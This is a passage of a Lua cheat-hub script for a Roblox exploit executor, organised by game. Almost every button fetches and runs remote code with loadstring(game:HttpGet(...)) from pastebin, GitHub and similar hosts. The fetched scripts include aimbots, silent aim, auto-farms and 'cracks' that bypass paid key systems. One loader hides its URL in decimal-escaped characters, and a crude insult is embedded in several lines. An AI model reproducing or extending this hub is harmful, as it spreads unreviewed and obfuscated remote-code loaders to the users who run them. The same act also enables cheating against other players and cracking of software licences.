          end
    })
elseif game.GameId==3168615253 then
gametab=Window:CreateTab("Ability Wars")
Button = gametab:CreateButton({
	Name = "Nut Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/Kzc4felK/raw",true))()
  	end
})
elseif game.GameId==6012788864 then
gametab=Window:CreateTab("Ability Wars")
Button = gametab:CreateButton({
    Name = "NS Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/ABB/main/Solara/Mobile"))()
    end
})
elseif game.GameId==5940874374 then
gametab=Window:CreateTab("Animal Race Simulator")
Button = gametab:CreateButton({
    Name = "Ywxo Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/AnimalRace2222.lua",true))()
    end
})
local Section = gametab:CreateSection("Set spin multi to 1 and turn on for inf everything")
elseif game.GameId==5753785106 then
gametab=Window:CreateTab("Anime Heros Simulator")
Button = gametab:CreateButton({
        Name = "DK Hub",
        Callback = function()
            loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
          end
    })
Button = gametab:CreateButton({
        Name = "NS Hub Keyless Crack",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/AH2/main/PC"))()
          end
    })
local Section = gametab:CreateSection("Execute one script only or it will give error. You can rejoin and execute other script")
elseif game.GameId==5864273770 then
gametab=Window:CreateTab("Anime Punching Simulator 2")
Button = gametab:CreateButton({
    Name = "NS Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/APS2/main/Solara"))()
    end
})
Button = gametab:CreateButton({
    Name = "DK Hub",
    Callback = function()
        loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
    end
})
elseif game.GameId==5966392437 then
    gametab=Window:CreateTab("Anime Speed Race")
    Button = gametab:CreateButton({
    Name = "Ywxo Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/AnimeSpeedRace2.lua"))()
    end
})
local Section = gametab:CreateSection("Set spin multi to 1 and turn on for inf everything")
elseif game.GameId==3989869156 then
    gametab=Window:CreateTab("Ant War")
    Button = gametab:CreateButton({
    Name = "Spectrum Hub",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/wisKAhf3/raw",true))()
    end
})
    Button = gametab:CreateButton({
    Name = "Ywxo Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/AW.lua"))()
    end
})
elseif game.GameId==111958650 then
gametab=Window:CreateTab("Arsenal")
gametab:CreateLabel("Don't Execute too many script at same time or it will give error")
Button = gametab:CreateButton({
    Name = "QP Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/QPScript/Script/main/Arsenal.txt"))()
    end
})
Button = gametab:CreateButton({
    Name = "LEG Hub",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/G6Ubkkuv"))()
    end
})
Button = gametab:CreateButton({
    Name = "Thunder Client Light v2",
    Callback = function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/b95e8fecdf824e41f4a030044b055add.lua'))()
    end
})
Button = gametab:CreateButton({
    Name = "Stormware Lite",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox-Exploit/main/Stormware_Crack"))()
    end
})
Button = gametab:CreateButton({
    Name = "Tanqr Hub",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/mXQLj82U"))()
    end
})
Button = gametab:CreateButton({
    Name = "Silent Aim Gui",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/iFDUTWfp"))()
    end
})
Button = gametab:CreateButton({
    Name = "Quotas Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv.0.4"))()
    end
})
Button = gametab:CreateButton({
    Name = "Open AimBot Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
        end
})
elseif game.GameId==4096039463 then
gametab=Window:CreateTab("Attack on Titan: Freedom War")
Button = gametab:CreateButton({
        Name = "Pork Hub",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/PorkDevMode/AotFwPublic/main/Script.luau'))()
          end
    })
elseif game.GameId==5976020326 then
gametab=Window:CreateTab("Admin RNG")
Button = gametab:CreateButton({
	Name = "Auto Roll No Gui",
	Callback = function()
		while true do local args = { [1] = true, [2] = true } game:GetService("ReplicatedStorage").Events.Spin:InvokeServer(unpack(args)) task.wait(0) end
	end
})
elseif game.GameId==5924989485 then
gametab=Window:CreateTab("Anime Simulator")
Button = gametab:CreateButton({
	Name = "Lyzer Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/keyrblxR",true))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazeruy/LyzerHub/main/ScriptMain"))()
	end
})
elseif game.GameId==3990106548 then
gametab=Window:CreateTab("Baddie")
Section = gametab:CreateSection("Click CTRL + V In key text box to paste key")
Button = gametab:CreateButton({
    Name = "Legends Hub (Copies Key)",
    Callback = function()
        setclipboard("K6sRxcQnkqd3v8gMtb5EZ2")
        loadstring(game:HttpGet(('https://pastefy.app/IB5tM3sE/raw'),true))()
    end
})
Button = gametab:CreateButton({
    Name = "Atm farm",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/g5lXK0Bk/raw",true))()
    end
})
elseif game.GameId==4931927012 then
gametab=Window:CreateTab("Basket Ball Legends")
Button = gametab:CreateButton({
    Name = "Obf Hub",
    Callback = function()
        _G.OBFHUBFREE = "2kmembersgang"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/obfhub/free/main/basketmball"))()
    end
})
elseif game.GameId==4019583467 then
gametab=Window:CreateTab("BE NPC OR DIE!")
Button = gametab:CreateButton({
	Name = "Arceus X Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BeNpcOrDie"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Icii Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iciidev/Icii-Cheats/main/iciicheats.lua", true))()
  	end
})
elseif game.GameId==2619619496 then
gametab=Window:CreateTab("Bedwars")
Button = gametab:CreateButton({
	Name = "Aurora",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/Aurora/main/Aurora_Loader"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Memz Ware",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/bw/main/test"))()
  	end
})
elseif game.GameId==601130232 then
	gametab=Window:CreateTab("Bee Swarm Simulator")
	Section = gametab:CreateSection("Dont Use Histy Hub with other scripts or it wont work")
	Button = gametab:CreateButton({
	Name = "Histy Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
  	end
})
Button = gametab:CreateButton({
	Name = "BaconBoss Hub",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeSwarmSim/main/BeeSwarmSim"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/29"))()
  	end
})
elseif game.GameId==4777817887 then
	gametab=Window:CreateTab("Blade Ball")
	Section = gametab:CreateSection("Infinix Hub Key System might be confusing.")
Button = gametab:CreateButton({
	Name = "Infinix Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/InfiniX/main/Games/Blade%20Ball/main.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "OP Manual Spam",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/SlzAX17vGCub7iRKVmJid61Bg/main/KwKVzV5SgcFBd9fnpLr4lKCg6.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "NeverLose Hub",
	Callback = function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\102\114\101\101\110\111\116\101\46\98\105\122\47\114\97\119\47\110\102\122\48\122\113\100\121\117\110\34\41\41\40\41\10")()
  	end
})
Button = gametab:CreateButton({
	Name = "Schema Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/manimanni/Schema/main/posse.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "FFJ Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "EminX Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EminenceXLua/Blade-your-Balls/main/BladeBallLoader.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Balls01 Hub",
	Callback = function()
		loadstring(game:HttpGet("https://rentry.co/7wrzwray/raw",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/songolasangkatangw/memek/main/adakontolsamamemek.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "PitBull Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/PitbullHubX/main/Loader.lua", true))()
  	end
})
elseif game.GameId==5440820902 then
	gametab=Window:CreateTab("Blade Slayer")
Button = gametab:CreateButton({
	Name = "DK Hub",
	Callback = function()
        loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
  	end
})
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/1BladeSlayer.lua"))()
  	end
})
elseif game.GameId==4953639303 then
	gametab=Window:CreateTab("Block Mayhem")
Button = gametab:CreateButton({
	Name = "Auto Collect Money (Lags Alot)",
	Callback = function()
		loadstring(game:HttpGet("https://scriptblox.com/raw/5X-Block-Mayhem-Auto-farm-updated-13550"))()
  	end
})
Button = gametab:CreateButton({
	Name = "FPS Booster (Use If Too Much Lag)",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/qcqBuz16"))()
  	end
})
elseif game.GameId==5678284602 then
	gametab=Window:CreateTab("Block Tales")
Button = gametab:CreateButton({
	Name = "God mode / Inf health",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/OtherScripts/main/BlockTalesGodmode.lua"))()
  	end
})
elseif game.GameId==88070565 then
	gametab=Window:CreateTab("Blox Burg")
	Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/myown/bloxburg.lua'))()
  	end
})
elseif game.GameId==994732206 then
	gametab=Window:CreateTab("Blox Fruit")
	Button = gametab:CreateButton({
		Name = "Bloxy Hub PVP Only",
		Callback = function()
			loadstring(game:HttpGet("https://bloxxyserverfiles.netlify.app/MegaBloxxyPVP"))()
		  end
	})
Button = gametab:CreateButton({
	Name = "BKHAX Hub",
	Callback = function()
        loadstring(game:HttpGet(("https://raw.githubusercontent.com/koonpeatch/PeatEX/master/BKHAX/BloxFruits"),true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Perd Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PerdHub/Blosfruitscript/main/PerdLoader"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Zen Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenhubtop/zen_hub_pr/main/zennewwwwui.lua", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Matsune Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
  	end
})
Section = gametab:CreateSection("All scripts support lvl farm only nothing else.")
elseif game.GameId==4807308814 then
	gametab=Window:CreateTab("Break In 2")
Button = gametab:CreateButton({
	Name = "Starry Hub",
	Callback = function()
		loadstring(game:HttpGet('https://github.com/mr-suno/Starry/releases/latest/download/main.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/danielontopp/scripts/main/77_OCM25E2M.lua.txt",true))()
  	end
})
elseif game.GameId==1318971886 then
	gametab=Window:CreateTab("Break In")
	Button = gametab:CreateButton({
	Name = "Magixx Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/vwCPc9hv",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Moon X Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Darkmoonxhubscript/BreakIn1/main/BreakIn1'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Bebo Hub",
	Callback = function()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/BreakInStory.lua")))()
  	end
})
Button = gametab:CreateButton({
	Name = "X Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/XHub/main/HubLoader.lua", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Open Hub",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Break-In-(Story)-Open-Source-3527",true))()
  	end
})
elseif game.GameId==1686885941 then
gametab=Window:CreateTab("Brookhaven")
Button = gametab:CreateButton({
	Name = "R4D hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Redz hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/TrollVersion",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Get All Tools",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/KFvnRQyu",true))()
  	end
})
elseif game.GameId==210851291 then
	gametab=Window:CreateTab("Build A Boat For Treasure")
Button = gametab:CreateButton({
	Name = "Quarty Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Zeerox Hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Phantom Hub",
	Callback = function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/Erp5dMPH'),true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Batus's BABFT Hub",
	Callback = function()
        a,b,c = "juywvm","main","babft";loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/-Roblox-Projects-/%s/%s"):format(a, b, c)))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ski Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Yousuck780/Build-A-Boat-For-Treasure/main/Build%20A%20Boat%20For%20Treasure", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/BuildABoatForTreasure1002.lua"))()
  	end
})
elseif game.GameId==2768038118 then
	gametab=Window:CreateTab("Build A Boat With Blocks")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/BuildABoatWithBlocks6969.lua"))()
  	end
})
elseif game.GameId==5617346821 then
	gametab=Window:CreateTab("Build A Bridge Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/BuildABridgeSim2931.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Tupo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lordjrd/Scripts/main/Build%20a%20Bridge%20Simulator"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/AppleScript001/Build_A_Bridge_Simulator/main/README.md"),true))()
  	end
})
elseif game.GameId==4695428699 then
	gametab=Window:CreateTab("Build A Raft or Die")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/BuildaRaftorDie30.lua"))()
  	end
})
elseif game.GameId==5380927916 then
	gametab=Window:CreateTab("Boss Slayer")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/BladeSlayer1331.lua"))()
  	end
})
elseif game.GameId==2583564222 then
	gametab=Window:CreateTab("Boxing Beta")
Button = gametab:CreateButton({
	Name = "Random OP HUB",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/mxkxkks1/Boxing-Beta-UI/main/main.lua"))()
  	end
})
elseif game.GameId==1802741133 then
	gametab=Window:CreateTab("Cabin Crew Simulator")
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/myown/CabinCrewSim.lua'))()
  	end
})
elseif game.GameId==274816972 then
	gametab=Window:CreateTab("Car Crushers 2")
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/benomat/scripts/m/myown/CarCrushers2.lua",true))()
  	end
})
elseif game.GameId==605887098 then
	gametab=Window:CreateTab("Car Dealership Tycoon")
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/cardealership.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Moon Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/F347-FB/Roblox/main/Loader"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ultimate Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
  	end
})
elseif game.GameId==5747808233 then
	gametab=Window:CreateTab("Catch a Fish Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/CatchAFishSim1.lua"))()
  	end
})
elseif game.GameId==3936365689 then
	gametab=Window:CreateTab("Clover Retribution")
Button = gametab:CreateButton({
	Name = "Lazy Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/lazy')'not mine: crack by frostlua, lazy hub by LioK'
  	end
})
Button = gametab:CreateButton({
	Name = "EclipseX Hub (Copies Key)",
	Callback = function()
        setclipboard("EZd7kjBvIF")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JackCSTM/eclipsex/main/script"))()
  	end
})
Label = gametab:CreateLabel("Just Click CTRL + V To Paste Key")
elseif game.GameId==1390601379 then
	gametab=Window:CreateTab("Combat Warriror")
Button = gametab:CreateButton({
	Name = "Head Hitbox (No GUI)",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/UauTz6D4"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Speed and hitbox",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/combatwarriors'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Bird Hub",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/pexrijZn'))()
  	end
})
elseif game.GameId==115797356 then
	gametab=Window:CreateTab("Counter Blox")
Button = gametab:CreateButton({
	Name = "Matrix Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fuckmath/shit/main/main.lua"))()
	end,
 })
 Button = gametab:CreateButton({
	Name = "FOGOTT Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/counter/main/blox"))()
	end,
 })
 Button = gametab:CreateButton({
	Name = "Strat Ware",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Stratxgy/StratWare/main/StratWare.lua"))()
	end,
 })
 Button = gametab:CreateButton({
	Name = "firebrandw Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Zdayee/firebrandw/main/universal"))()
	end,
 })
elseif game.GameId==4915449246 then
	gametab=Window:CreateTab("Cursed Arena")
Button = gametab:CreateButton({
	Name = "NS Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/CA2/main/Solara"))()
  	end
})
elseif game.GameId==6307897893 then
	gametab=Window:CreateTab("Car RNG")
Button = gametab:CreateButton({
	Name = "Auto Roll Fast",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/scvLp66w",true))()
  	end
})
elseif game.GameId==1008451066 then
	gametab=Window:CreateTab("Da Hood")
Button = gametab:CreateButton({
	Name = "Polakya Hub",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/pixelheadx/Polakya/main/Bestscript.md"))()
	end,
 })
Button = gametab:CreateButton({
	Name = "Vortex Hub",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ImagineProUser/vortexdahood/main/vortex", true))()
	end,
 })
Button = gametab:CreateButton({
	Name = "BeamedWare Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasAtto1/BeamedWare/main/BeamedWare2.0"))()
	end,
 })
Button = gametab:CreateButton({
	Name = "Faded Hub",
	Callback = function()
		_G.Toggles = "V"
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))()
	end,
 })
Button = gametab:CreateButton({
	Name = "Aimlock",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/Qrto1/aimlock/main/dahod')))()
	end,
 })
 Button = gametab:CreateButton({
	Name = "Aimlock V2 (Keybind : C To unlock / lock aim)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenOnRoblox/da-hood-camlock/main/.gitignore"))()
	end,
 })
elseif game.GameId==1650291138 then
	gametab=Window:CreateTab("Demon Fall")
  Button = gametab:CreateButton({
	Name = "Drowned Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/Krakles/main/DrownedHub/Demonfall.lua"))()
	end,
 })
elseif game.GameId==2440500124 then
	gametab=Window:CreateTab("Doors")
Button = gametab:CreateButton({
	Name = "FFJ Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
	end,
 })
Button = gametab:CreateButton({
	Name = "Door Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/M4mpGErb",true))()
	end,
 })
elseif game.GameId==5203828273 then
	gametab=Window:CreateTab("Dress To Impress")
Button = gametab:CreateButton({
	Name = "Op Script",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua",true))()
  	end
})
elseif game.GameId==1202096104 then
	gametab=Window:CreateTab("Driving Empire")
Button = gametab:CreateButton({
	Name = "Marco Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/drivingempire", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Lightux Hub",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/DrivingEmpireEvents/main/README.md'),true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/myown/drivingempire.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Nut Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/B3bzy9h6/raw",true))()
  	end
})
elseif game.GameId==848145103 then
	gametab=Window:CreateTab("Dungeon Quest")
Button = gametab:CreateButton({
	Name = "NS Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/keyrblxR",true))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/DQ/main/Solara"))()
  	end
})
Label = gametab:CreateLabel("Key : Nut Hub")
elseif game.GameId==6002149925 then
	gametab=Window:CreateTab("Dungeon RNG")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/DungeonRNG231.lua"))()
  	end
})
elseif game.GameId==5235037897 then
	gametab=Window:CreateTab("Da Strike")
Button = gametab:CreateButton({
	Name = "Random Hub No GUI",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/pthS13mK"))();
  	end
})
elseif game.GameId==5770990128 then
	gametab=Window:CreateTab("Eat World Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/EatBlocksSim70.lua"))()
  	end
})
elseif game.GameId==5677613211 then
	gametab=Window:CreateTab("Eat The World")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Mongusohio/EatTheWorldMadeBySederYTTV/main/Heresomerizzgrimacr"))()
  	end
})
elseif game.GameId==110181652 then
	gametab=Window:CreateTab("Epic MiniGames")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Zetox V7",
	Callback = function()
		loadstring(game:GetObjects("rbxassetid://02565551523")[1].Source)()
  	end
})
elseif game.GameId==3647333358 then
	gametab=Window:CreateTab("Evade")
Button = gametab:CreateButton({
	Name = "Tbao Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade"))()
  	end
})
elseif game.GameId==4201418016 then
	gametab=Window:CreateTab("Fabled Legacy!")
Button = gametab:CreateButton({
	Name = "NS Hub",
	Callback = function()
    	loadstring(game:HttpGet('https://raw.githubusercontent.com/OhhMyGehlee/FL/main/Solara'))()
  	end
})
elseif game.GameId==372226183 then
	gametab=Window:CreateTab("Flee The Facility")
Button = gametab:CreateButton({
	Name = "Yarhm Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
  	end
})
Button = gametab:CreateButton({
	Name = "Spimine Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/antisocialb2/SPIMINE-FLEETHEFACILITY/main/script.lua'))()
  	end
})
elseif game.GameId==2668101271 then
	gametab=Window:CreateTab("Fling Things And People")
Button = gametab:CreateButton({
	Name = "VHSV4 Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/VHSV4"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Auto Aim",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/d0uJjTkD",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Show Spin Timer On Screen",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/n9tbnk4V",true))()
  	end
})
elseif game.GameId==3150475059 then
	gametab=Window:CreateTab("Football Fusion 2")
Button = gametab:CreateButton({
	Name = "Ishii Hub",
	Callback = function()
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7b4f22e1726966f40c91521aaeb11953.lua"))()
  	end
})
elseif game.GameId==2132866904 then
	gametab=Window:CreateTab("Fortlines")
Button = gametab:CreateButton({
	Name = "Thunder Client",
	Callback = function()
		loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/5bebf0b1e173f4baff73449722204837.lua'))()
  	end
})
elseif game.GameId==6146301100 then
	gametab=Window:CreateTab("Fat Race")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
